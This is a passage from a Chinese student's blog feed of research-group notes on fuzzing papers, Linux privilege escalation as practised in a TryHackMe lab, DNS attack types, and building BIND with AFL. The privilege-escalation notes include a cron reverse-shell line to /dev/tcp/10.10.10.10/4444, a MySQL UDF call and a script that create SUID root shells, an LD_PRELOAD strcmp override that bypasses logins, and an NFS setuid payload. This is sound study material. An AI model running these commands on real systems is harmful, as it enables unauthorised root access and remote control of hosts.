accounting，输入优化的新方法</li><li>开发了TortoiseFuzz，基于coverage accounting的灰盒fuzzer</li></ul><h3 id="coverage-accounting"><a href="#coverage-accounting" class="headerlink" title="coverage accounting"></a>coverage accounting</h3><p>对edges度量，进行输入优化，通过对输入进行优先级排序，缩短发现漏洞的时间；为了抵御anti-fuzzing，不依赖于污点分析或者符号执行。</p><p>从函数调用，循环和基本块三个粒度分别对edge进行度量。</p><ul><li>函数调用：从CVE以及其子页面中爬取数据，总结出一些易于出现问题的库函数的数据表。根据这些数据表，计算一个edge目的基本块中调用这些易于出现问题的库函数的函数个数</li><li>循环：若e是back edge（回边，其头是其尾的必经结点），则为1，否则为0</li><li>基本块：目的基本块中包含内存操作的指令个数</li></ul><h3 id="TORTOISEFUZZ的设计"><a href="#TORTOISEFUZZ的设计" class="headerlink" title="TORTOISEFUZZ的设计"></a>TORTOISEFUZZ的设计</h3><p>fuzzer的设计目的是结合coverage accounting，对更容易导致脆弱代码的输入进行优先级排序，同时保证优先输入覆盖足够的代码</p><ul><li>由于内存操作是内存错误的先决条件，所以只有安全敏感的edges才是漏洞的关键，因此应该被选择的输入完全覆盖。</li><li>通过coverage accounting的计算，并设置一个域值，当超过域值时，认为是安全敏感的</li><li>在输入的选择上，输入越是命中安全敏感的edges，越有可能演化为触发漏洞</li></ul><h2 id="可疑基本块导向的定向模糊测试技术研究"><a href="#可疑基本块导向的定向模糊测试技术研究" class="headerlink" title="可疑基本块导向的定向模糊测试技术研究"></a>可疑基本块导向的定向模糊测试技术研究</h2><h3 id="核心内容"><a href="#核心内容" class="headerlink" title="核心内容"></a>核心内容</h3><ul><li>利用静态污点分析筛选出目标程序所有可疑基本块，再通过函数间控制流分析得出基本块之间的可达性，以提取可到达可疑基本块集合的所有基本块<ul><li>这篇文章分析了三种问题：缓冲区溢出、整形溢出、移位位数过大的特征，使用污点分析方法找到这些特征所在的代码块。</li></ul></li><li>将可疑基本块以及可以到达这些块的块作为插桩对象，除此之外，无法到达该可疑基本块的块则不插桩，以此降低桩代码引入的额外开销。</li><li>计算所有基本块到可疑基本块集合的距离，根据该距离赋予基本块权重，距离越小权重越大</li><li>根据种子所触发路径上各基本块的权重计算其变异后漏洞发现概率，变异时优先选择漏洞发现概率更高的种子，借此优化种子选择过程，提高模糊测试漏洞挖掘效率。</li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;Alphuzz-Monte-Carlo-Search-on-Seed-Mutation-Tree-for-Coverage-Guided&quot;&gt;&lt;a href=&quot;#Alphuzz-Monte-Carlo-Search-on-Seed-Mutation-Tree-for-Coverage-Guided&quot; class=&quot;headerlink&quot; title=&quot;Alphuzz: Monte Carlo Search on Seed-Mutation Tree for Coverage-Guided&quot;&gt;&lt;/a&gt;Alphuzz: Monte Carlo Search on Seed-Mutation Tree for Coverage-Guided&lt;/h2&gt;&lt;h3 id=&quot;abstract&quot;&gt;&lt;a href=&quot;#abstract&quot; class=&quot;headerlink&quot; title=&quot;abstract&quot;&gt;&lt;/a&gt;abstract&lt;/h3&gt;&lt;p&gt;在本研究中，我们发现种子之间的关系对于种子调度是有价值的。我们通过研究和利用种子之间的变异关系，设计并提出了一个”种子变异树”。利用”种子变异树”，我们进一步将种子调度问题建模为蒙特卡洛树搜索( MCTS )问题。即在MCTS估计的基础上，通过最优路径遍历”种子变异树”，选择下一个种子进行模糊处理。&lt;/p&gt;
&lt;h3 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#introduction&quot; class=&quot;headerlink&quot; title=&quot;introduction&quot;&gt;&lt;/a&gt;introduction&lt;/h3&gt;&lt;p&gt;大量的种子调度策略被提出。一般来说，这些策略的目的是根据一定的标准为每个种子分配一个分数，然后选择分数最高的种子进行下一次的模糊迭代。例如，AFL偏好于具有最小尺寸和最短执行时间的种子。这些策略独立地对待这些种子，并没有明确地考虑种子之间的关系。&lt;/p&gt;
&lt;p&gt;“种子变异树”的主要优点是有利于种子调度在利用式(即,反复锻炼一个高电位的种子和它的邻居)和探索式(即,尝试一个很少锻炼的种子)之间进行平衡，以获得最佳性能。如上所述，种子调度是指为探索其邻居路径而选择一条执行路径。利用种子之间的关系，我们可以进一步将每个种子对应的路径组织为一个树结构，记为执行树。&lt;/p&gt;</summary>
    
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/categories/%E7%BB%84%E4%BC%9A/"/>
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/tags/%E7%BB%84%E4%BC%9A/"/>
    
    <category term="文献阅读" scheme="https://jingtianer.github.io/home/tags/%E6%96%87%E7%8C%AE%E9%98%85%E8%AF%BB/"/>
    
  </entry>
  
  <entry>
    <title>DNS第四周调研</title>
    <link href="https://jingtianer.github.io/home/2023/02/02/%E7%BB%84%E4%BC%9A/DNS%E7%AC%AC%E5%9B%9B%E5%91%A8%E8%B0%83%E7%A0%94/"/>
    <id>https://jingtianer.github.io/home/2023/02/02/%E7%BB%84%E4%BC%9A/DNS%E7%AC%AC%E5%9B%9B%E5%91%A8%E8%B0%83%E7%A0%94/</id>
    <published>2023-02-02T04:15:37.000Z</published>
    <updated>2023-02-12T03:09:54.318Z</updated>
    
    <content type="html"><![CDATA[<h2 id="主机提权"><a href="#主机提权" class="headerlink" title="主机提权"></a>主机提权</h2><ul><li><a href="https://zhuanlan.zhihu.com/p/432182767">参考</a></li><li><a href="https://zhuanlan.zhihu.com/p/304572787">蓝桥杯教程</a></li><li><a href="https://tryhackme.com/room/linuxprivesc">tryHackme</a>，这是一个靶场，提供了21个主机提权的task</li></ul><h3 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h3><ol><li><p>UDF全名user-defined function capability</p></li><li><p>它可以通过对MYSQL中的函数调用连接系统上可用的系统动态库</p></li></ol><h4 id="UDF攻击条件"><a href="#UDF攻击条件" class="headerlink" title="UDF攻击条件"></a>UDF攻击条件</h4><ol><li>必须获得MYSQL的账号最好是root，然后去到MYSQL里面检查是否拥有insert插入权限，检查命令: <code>select User,Host from user where Insert_priv=&#39;Y&#39;;</code>是否有输出</li><li>可以更改数据库当然拿到root最好</li><li>允许拷贝文件进来(检查命令: <code>show variables like &#39;local_infile&#39;;</code>结果为ON才行)</li></ol><h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h4><ol><li>首先攻进去并且获得一个MYSQL数据库账号且权限比较高</li><li>上传一个恶意的动态库文件</li><li>在进入MYSQL以后通过insert函数把动态库文件存储进来</li><li>搭建连接</li><li>执行</li><li>复现过程,首先需要准备好文件，kali上已有(raptor_udf2.so)</li><li>创建do_system函数</li><li>执行函数 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> do_system(<span class="string">&#x27;cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li>启动这个bash</li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/tmp/rootbash -p</span><br></pre></td></tr></table></figure><h3 id="可读的-x2F-etc-x2F-shadow文件"><a href="#可读的-x2F-etc-x2F-shadow文件" class="headerlink" title="可读的&#x2F;etc&#x2F;shadow文件"></a>可读的&#x2F;etc&#x2F;shadow文件</h3><p><code>/etc/shadow</code>和<code>/etc/passwd</code>上面都会存储着这台机子上的用户密码信息。<code>passwd</code>可读但不会显示具体密码，理论上来讲只有<code>root</code>才能改。而<code>shadow</code>有加密的账号密码信息但是一般来讲是不可读的。这里假设我们拥有对<code>/etc/shadow</code>的读写权限。</p><p>保存成文本信息，可用<code>john</code>进行解密。最后得到密码。</p><h3 id="可写的-x2F-etc-x2F-shadow文件"><a href="#可写的-x2F-etc-x2F-shadow文件" class="headerlink" title="可写的&#x2F;etc&#x2F;shadow文件"></a>可写的&#x2F;etc&#x2F;shadow文件</h3><p>通过<code>john</code>获取<code>/etc/shadow</code>的加密方法，使用相同的加密方法将密码替换</p><h3 id="可写的-x2F-etc-x2F-passwd文件"><a href="#可写的-x2F-etc-x2F-passwd文件" class="headerlink" title="可写的&#x2F;etc&#x2F;passwd文件"></a>可写的&#x2F;etc&#x2F;passwd文件</h3><p>使用以下命令生成加密后的密码，修改<code>/etc/passwd</code>中root的密码</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd 123456</span><br></pre></td></tr></table></figure><h3 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h3><ul><li><a href="https://www.cnblogs.com/vir-k/p/16301456.html">sudo提权参考</a></li></ul><p>在Linux&#x2F;Unix中，<code>/etc/sudoers</code>文件是<code>sudo</code>权限的配置文件，其中储存了一些用户或组可以以<code>root</code>权限使用的命令。通过<code>sudo -l</code>可以查看用户能以root权限运行的命令</p><p>可以利用sudo提权的命令如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget、find、cat、apt、zip、xxd、time、taskset、git、sed、pip、ed、tmux、scp、perl、bash、less、awk、man、vi、env、ftp、ed、screen</span><br></pre></td></tr></table></figure><p>在<code>/etc/sudoers</code>中需要有以下内容</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/awk</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/vim</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/man</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/apache2</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/less</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /bin/more</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/find</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/zip</span><br><span class="line">hacker  ALL=(root) NOPASSWD: /usr/bin/git</span><br></pre></td></tr></table></figure><p><code>hacker</code>用户可以以<code>root</code>身份运行<code>awk</code>, <code>vim</code> 等命令即可</p><h4 id="攻击流程-1"><a href="#攻击流程-1" class="headerlink" title="攻击流程"></a>攻击流程</h4><p>每个命令具体的攻击流程在上面的<a href="#sudo%E6%8F%90%E6%9D%83">参考</a>中有写</p><h3 id="环境变量提权"><a href="#环境变量提权" class="headerlink" title="环境变量提权"></a>环境变量提权</h3><p><code>LD_LIBRARY_PATH</code> : 提供首先会在某些动态库里面列出会使用到哪些动态库</p><p><code>LD_PRELOAD</code> : 在某个程序运行前先加载一个对象</p><h4 id="一个preload-c的例子"><a href="#一个preload-c的例子" class="headerlink" title="一个preload.c的例子"></a>一个preload.c的例子</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 文件名：preload.c */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">strcmp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s1, <span class="type">const</span> <span class="type">char</span> *s2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hack function invoked. s1=&lt;%s&gt; s2=&lt;%s&gt;/n&quot;</span>, s1, s2);</span><br><span class="line">        <span class="comment">/* 永远返回0，表示两个字符串相等 */</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果登录验证时使用了strcmp函数比较输入字符串和密码是否相同，替换该函数，使得strcmp永远返回0。</p><h3 id="cron-job提权"><a href="#cron-job提权" class="headerlink" title="cron job提权"></a>cron job提权</h3><p>假设root会定期使用<code>cron</code>执行<code>overwrite.sh</code>这个脚本，找到这个脚本发现该脚本是可编辑的，将该脚本的替换成以下内容</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>创建一个交互式的bash，并将输入输出重定向到 <code>/dev/tcp/10.10.10.10/4444</code> socket连接上。</p><h3 id="cron-环境变量提权"><a href="#cron-环境变量提权" class="headerlink" title="cron 环境变量提权"></a>cron 环境变量提权</h3><p>在<code>/etc/crontab</code>中显示的环境变量<code>$PATH</code>是从<code>/home/user</code>找起，而root执行的<code>overwrite.sh</code>在<code>usr/local/bin</code>中，可以在<code>/home/user</code>下写入一个<code>overwrite.sh</code>文件来提权</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cp</span> /bin/bash /tmp/rootBash</span><br><span class="line"><span class="built_in">chmod</span> +xs /tmp/rootBash</span><br></pre></td></tr></table></figure><h3 id="查看历史寻找敏感信息"><a href="#查看历史寻找敏感信息" class="headerlink" title="查看历史寻找敏感信息"></a>查看历史寻找敏感信息</h3><p>查看输入命令的历史，看其中是否有密码、敏感信息</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> ~/.*<span class="built_in">history</span></span><br></pre></td></tr></table></figure><h3 id="NFS提权"><a href="#NFS提权" class="headerlink" title="NFS提权"></a>NFS提权</h3><p>在NFS中，如果配置了<code>root_squash</code>，当使用root用户登录访问时，会将root用户转换成匿名用户。此时他的<code>uid</code>和<code>gid</code>都会变成<code>nobody</code>账号的身份。如果配置了<code>no_root_squash</code>，则会以<code>root</code>身份直接访问。</p><p>此时在nfs中创建文件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">setpid</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">setgid</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;/bin/bash/&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对他进行编译，等待编译后的文件同步到靶机上，进行执行，即可提权</p><h3 id="Capability提权"><a href="#Capability提权" class="headerlink" title="Capability提权"></a>Capability提权</h3><p>从2.1版本以后Linux开始引入capability让普通用户也可干root可做的事。capability可让某个程序拥有超能力而sudo只是针对某个用户&#x2F;文件赋予它SUID(超能力)。</p><p>使用该命令可以找到具有<code>cap_setuid</code>能力的程序，具体提权方法可以查找<a href="https://gtfobins.github.io/"><code>gtfobin</code></a></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">getcap</span> -r 2&gt;/dev/null</span><br></pre></td></tr></table></figure><h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><p><code>dirtycow</code>可以对内核版本2.6左右的系统进行提权，可以借助<code>linux-exploit-suggester</code>等工具查询提权方法。</p><h3 id="提权相关漏洞"><a href="#提权相关漏洞" class="headerlink" title="提权相关漏洞"></a>提权相关漏洞</h3><ul><li>CVE-2019-19495，web页面设计问题导致页面收到DNS rebinding攻击，使外部能够访问root shell</li><li>CVE-2019-12511，通过向”NETGEAR Genie” SOAP 端点发送特制的MAC地址，就可以以root用户身份执行任意系统命令</li><li>CVE-2000-1029，CVE-2002-0029，CVE-2002-0684，Buffer overflow导致攻击方可以以root身份执行任意命令</li><li>CVE-2001-0013，字符串格式化问题导致攻击者获取riit权限</li><li><a href="https://www.cvedetails.com/product/144/ISC-Bind.html?vendor_id=64">ISC » Bind : Vulnerability Statistics</a>显示了历年找到的bind中的各类bug</li></ul><h2 id="域名解析服务扰乱-三类"><a href="#域名解析服务扰乱-三类" class="headerlink" title="域名解析服务扰乱 (三类)"></a>域名解析服务扰乱 (三类)</h2><ul><li><a href="https://mp.weixin.qq.com/s?__biz=MzUzNDYxOTA1NA==&mid=2247530965&idx=1&sn=5c35152b5545c2716af43b85144acab4&chksm=fa93cf14cde44602f937581f78af1a3c9b9c08acec40383e9c00722d343a1b67ad388a3986ac&scene=27">参考1–简析DNS攻击的常见类型、危害与防护建议</a></li><li><a href="https://heimdalsecurity.com/blog/anatomy-of-a-dns-attack/">参考2–On the Anatomy of a DNS Attack – Types, Technical Capabilities, and Mitigation</a></li><li><a href="https://www.itu.int/en/ITU-D/Regional-Presence/Americas/Documents/EVENTS/2016/15551-EC/2A.pdf">参考3–Attacks Against The DNS</a></li></ul><h3 id="拒绝服务-DoS-类攻击"><a href="#拒绝服务-DoS-类攻击" class="headerlink" title="拒绝服务(DoS)类攻击"></a>拒绝服务(DoS)类攻击</h3><p>通过耗尽机器或网络的资源将其服务关闭，阻止用户访问机器或网络。需要强调的是，这种攻击的目的主要用于隐藏踪迹或阻碍受害者恢复工作。</p><h4 id="DNS放大"><a href="#DNS放大" class="headerlink" title="DNS放大"></a>DNS放大</h4><ul><li>Reflection Attack</li><li>Reflection Attack And Amplification Attack</li><li>Distributed Reflection And Amplification Attack</li></ul><p>DNS放大是DoS攻击中用于利用域名系统并加大目标网站流量的一种技术。这种攻击方法利用的主要技术包括DNS反射和地址伪造。不法分子实施这种攻击的手法是，向域名系统服务器发送伪造的IP数据包，请求目标的域名，使用目标的IP地址代替自己的IP地址。</p><p>所有这些查询都由DNS服务器用目标机器的IP地址来答复。然后，受害者的服务器向每个请求发送相同的答复。这导致庞大的数据流量从受害者网络的端口80或25流入。</p><blockquote><p>伪造DNS请求，并替换请求中的源地址替换成攻击对象(target)的地址，称为<code>Reflection Attack</code>，如果在此基础上向DNS发送大量的请求，使target<code>80/25</code>端口接收过多攻击，称为<code>Reflection Attack And Amplification Attack</code>，如果多个Attacker对DNS发起此类虚假的请求，称为<code>Distributed Reflection And Amplification Attack</code></p></blockquote><h4 id="SYN-Flood-Resource-Depletion-DOS-Attack"><a href="#SYN-Flood-Resource-Depletion-DOS-Attack" class="headerlink" title="SYN Flood (Resource Depletion DOS Attack)"></a>SYN Flood (Resource Depletion DOS Attack)</h4><p><img src="https://github.com/jingtianer/home/blob/gh-pages/images/ResDepletionDosAttack.png?raw=true" alt="Resource Depletion DOS Attack"></p><blockquote><p>利用target的ip发起TCP连接，DNS为TCP连接分配资源，最终导致Fail，停止服务</p></blockquote><h4 id="Basic-Cache-Poisoning"><a href="#Basic-Cache-Poisoning" class="headerlink" title="Basic Cache Poisoning"></a>Basic Cache Poisoning</h4><p><img src="https://github.com/jingtianer/home/blob/gh-pages/images/BasicCachePoisoning.png?raw=true" alt="Basic Cache Poisoning"></p><blockquote><p>令本地解析器缓存错误的ip地址</p></blockquote><h4 id="NXDOMAIN-Cache-Exhaustion"><a href="#NXDOMAIN-Cache-Exhaustion" class="headerlink" title="NXDOMAIN Cache Exhaustion"></a>NXDOMAIN Cache Exhaustion</h4><p><img src="https://github.com/jingtianer/home/blob/gh-pages/images/NXDOMAIN.png?raw=true" alt="NXDOMAIN Cache Exhaustion"></p><blockquote><p>攻击者向DNS服务器发送大量不存在的域名的查询请求，导致DNS服务器中存储了大量NXDOMAIN信息，导致其缓存溢出，停止服务</p></blockquote><h4 id="Dos-e-g"><a href="#Dos-e-g" class="headerlink" title="Dos e.g."></a>Dos e.g.</h4><ul><li>Exploit To Fail，<a href="http://www.cvedetails.com/cve/CVE-2002-0400/">Malicious DNS message injection–(CVE-2002-0400)</a><ul><li>Exploit a vulnerability in some element of a name server infrastructure to cause interruption of name resolution service，利用DNS服务器基础结构的某些元素中的漏洞导致名称解析服务中断</li></ul></li><li>Exploit To Own，<a href="http://www.kb.cert.org/vuls/id/844360">Arbitrary&#x2F;remote code execution</a><ul><li>Exploit a vulnerability in some element of a name server infrastructure to gain system administrative privileges，利用DNS服务器基础结构的某些元素中的漏洞获得系统管理特权</li></ul></li><li>Reflection Attack，<a href=""></a></li></ul><h3 id="分布式拒绝服务-DDoS-类攻击"><a href="#分布式拒绝服务-DDoS-类攻击" class="headerlink" title="分布式拒绝服务(DDoS)类攻击"></a>分布式拒绝服务(DDoS)类攻击</h3><ul><li>UDP Flood</li><li>HTTP Flood<ul><li>这两个和SYN Flood相似，发送大量请求导致target资源不足而崩溃</li></ul></li><li>反射式跨站点脚本(XSS)<ul><li>当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web 服务器将注入脚本，比如一个错误信息，搜索结果等 返回到用户的浏览器上。由于浏览器认为这个响应来自”可信任”的服务器，所以会执行这段脚本。</li><li>通过DNS TXT记录在上注入恶意脚本，当通过Whois服务检查他的域时，脚本会立即执行。</li></ul></li></ul><h3 id="DNS-劫持类攻击"><a href="#DNS-劫持类攻击" class="headerlink" title="DNS 劫持类攻击"></a>DNS 劫持类攻击</h3><p>发生DNS劫持攻击时，网络攻击者会操纵域名查询的解析服务，导致访问被恶意定向至他们控制的非法服务器，这也被成为DNS投毒或DNS重定向攻击。<br>DNS 劫持攻击在网络犯罪领域也很常见。DNS劫持活动还可能破坏或改变合规DNS服务器的工作。除了实施网络钓鱼活动的黑客外，这还可能由信誉良好的实体(比如ISP)完成，其这么做是为了收集信息，用于统计数据、展示广告及其他用途。此外，DNS服务提供商也可能使用流量劫持作为一种审查手段，防止访问特定页面。</p><blockquote><p>通过恶意AP，路由器将DNS请求重定向到攻击者的DNS服务器上</p></blockquote><h4 id="DNS欺骗"><a href="#DNS欺骗" class="headerlink" title="DNS欺骗"></a>DNS欺骗</h4><p>DNS欺骗又叫DNS缓存中毒，是网络犯罪分子用来诱骗用户连接到他们建立的虚假网站而不是合法网站的一种方法。有人通过域名系统请求访问网站，而DNS服务器回应不准确的IP地址时，这被认为是DNS欺骗攻击。然而，不仅仅是网站容易受到这种攻击。黑客还可以使用这种方法，访问电子邮件账户及其他私密数据。</p><blockquote><p>DNS返回的数据被篡改，返回了不准确的IP地址</p></blockquote><h4 id="Configuration-Poisoning-DNSChanger"><a href="#Configuration-Poisoning-DNSChanger" class="headerlink" title="Configuration Poisoning: DNSChanger"></a>Configuration Poisoning: DNSChanger</h4><p><img src="https://github.com/jingtianer/home/blob/gh-pages/images/ConfigPoisoningDNS.png?raw=true" alt="Configuration Poisoning: DNSChanger"></p><blockquote><p>通过恶意软件修改DNS的配置文件</p></blockquote><h4 id="DNS-Hostname-Overflow-Attack"><a href="#DNS-Hostname-Overflow-Attack" class="headerlink" title="DNS Hostname Overflow Attack"></a>DNS Hostname Overflow Attack</h4><blockquote><p>攻击者返回的消息中包含大于255字节的域名，导致Buffer溢出，使得攻击者可以获得root或执行特权指令</p></blockquote><h4 id="DNS隧道"><a href="#DNS隧道" class="headerlink" title="DNS隧道"></a>DNS隧道</h4><p>网络流量可以使用DNS隧道的方式绕过网络过滤器和防火墙等机制，以建立另外的数据传输通道。启用DNS隧道后，用户的连接将通过远程服务器路由传输互联网流量。不幸的是，黑客经常将此用于恶意目的。被恶意使用时，DNS隧道是一种攻击策略，数据通过DNS查询来传递。除了通过平常会阻止这类流量的网络秘密发送数据外，这还可用于欺骗内容、避免过滤或防火墙检测。</p><blockquote><p>利用DNS进行隐蔽通信</p></blockquote><h4 id="DNS重新绑定"><a href="#DNS重新绑定" class="headerlink" title="DNS重新绑定"></a>DNS重新绑定</h4><p>DNS重新绑定是一种网络攻击方法，利用浏览器缓存的长期特性，欺骗受害者的浏览器在输入域名时联系恶意站点。攻击者可以使用任何联网设备（包括智能手机）来实施攻击，不需要任何类型的身份验证。受害者必须禁用浏览历史记录或打开浏览器隐身窗口，才能禁用缓存。利用该漏洞，攻击者可以将受害者浏览器对域名的请求，重新路由到托管有害内容的非法服务器。</p><blockquote><p>一般来说我们的操作系统默认能够将DNS返回来的这个IP地址信息保存60秒，而超过60秒后如果需要再次访问这个域名，就会重新去请求一次dns</p></blockquote><blockquote><p>对于浏览器来说，两次访问的都是同一域名，是符合浏览器的同源策略的，但是第二次访问解析到其他IP，调用到了其他资源。这样的行为被称之为域名重新绑定攻击（DNS ReBinding）。</p></blockquote><blockquote><ul><li>用户第一次访问，解析域名test.gm7.org的IP为104.21.26.222</li><li>在用户第二次访问前，修改域名解析的IP为127.0.0.1</li><li>用户第二次访问，解析域名test.gm7.org的IP为127.0.0.1 (一个不同的ip)</li></ul></blockquote><h4 id="DNS拼写仿冒"><a href="#DNS拼写仿冒" class="headerlink" title="DNS拼写仿冒"></a>DNS拼写仿冒</h4><p>DNS拼写仿冒是一种受DNS劫持启发的社会工程攻击技术，它使用域名中的错别字和拼写错误。常见的DNS拼写仿冒攻击始于攻击者注册一个域名，这个域名和目标的网站域名非常相似。攻击者随后搭建一个虚假网站，网站内容旨在说服用户提供敏感信息，包括登录密码、信用卡资料及其他个人信息。</p><blockquote><p>DNS拼写仿冒是社工技术的一种方法，攻击方注册一个和网站相似的域名来混淆用户。常见在登录密码以及识别验证方面。</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;主机提权&quot;&gt;&lt;a href=&quot;#主机提权&quot; class=&quot;headerlink&quot; title=&quot;主机提权&quot;&gt;&lt;/a&gt;主机提权&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/432182767&quot;&gt;参考&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/304572787&quot;&gt;蓝桥杯教程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/linuxprivesc&quot;&gt;tryHackme&lt;/a&gt;，这是一个靶场，提供了21个主机提权的task&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;UDF提权&quot;&gt;&lt;a href=&quot;#UDF提权&quot; class=&quot;headerlink&quot; title=&quot;UDF提权&quot;&gt;&lt;/a&gt;UDF提权&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;UDF全名user-defined function capability&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;它可以通过对MYSQL中的函数调用连接系统上可用的系统动态库&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&quot;UDF攻击条件&quot;&gt;&lt;a href=&quot;#UDF攻击条件&quot; class=&quot;headerlink&quot; title=&quot;UDF攻击条件&quot;&gt;&lt;/a&gt;UDF攻击条件&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;必须获得MYSQL的账号最好是root，然后去到MYSQL里面检查是否拥有insert插入权限，检查命令: &lt;code&gt;select User,Host from user where Insert_priv=&amp;#39;Y&amp;#39;;&lt;/code&gt;是否有输出&lt;/li&gt;
&lt;li&gt;可以更改数据库当然拿到root最好&lt;/li&gt;
&lt;li&gt;允许拷贝文件进来(检查命令: &lt;code&gt;show variables like &amp;#39;local_infile&amp;#39;;&lt;/code&gt;结果为ON才行)&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/categories/%E7%BB%84%E4%BC%9A/"/>
    
    
    <category term="组会" scheme="https://jingtianer.github.io/home/tags/%E7%BB%84%E4%BC%9A/"/>
    
    <category term="主机提权" scheme="https://jingtianer.github.io/home/tags/%E4%B8%BB%E6%9C%BA%E6%8F%90%E6%9D%83/"/>
    
    <category term="域名解析服务扰乱" scheme="https://jingtianer.github.io/home/tags/%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E6%9C%8D%E5%8A%A1%E6%89%B0%E4%B9%B1/"/>
    
  </entry>
  
  <entry>
    <title>使用afl对bind进行测试</title>
    <link href="https://jingtianer.github.io/home/2023/01/11/%E7%BB%84%E4%BC%9A/qsym%E5%AF%B9bind%E6%B5%8B%E8%AF%95/"/>
    <id>https://jingtianer.github.io/home/2023/01/11/%E7%BB%84%E4%BC%9A/qsym%E5%AF%B9bind%E6%B5%8B%E8%AF%95/</id>
    <published>2023-01-11T04:15:37.000Z</published>
    <updated>2023-03-01T06:44:45.509Z</updated>
    
    <content type="html"><![CDATA[<h2 id="使用afl对bind进行编译"><a href="#使用afl对bind进行编译" class="headerlink" title="使用afl对bind进行编译"></a>使用afl对bind进行编译</h2><ul><li>希望使用afl对bind进行编译</li><li>通过<code>./configure -help</code>知道，需要配置下面几个环境变量，达到替换编译器的目的</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> CC=<span class="string">&#x27;afl-gcc&#x27;</span></span><br><span class="line"><span class="built_in">export</span> CXX=<span class="string">&#x27;afl-g++&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>对bind进行编译</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 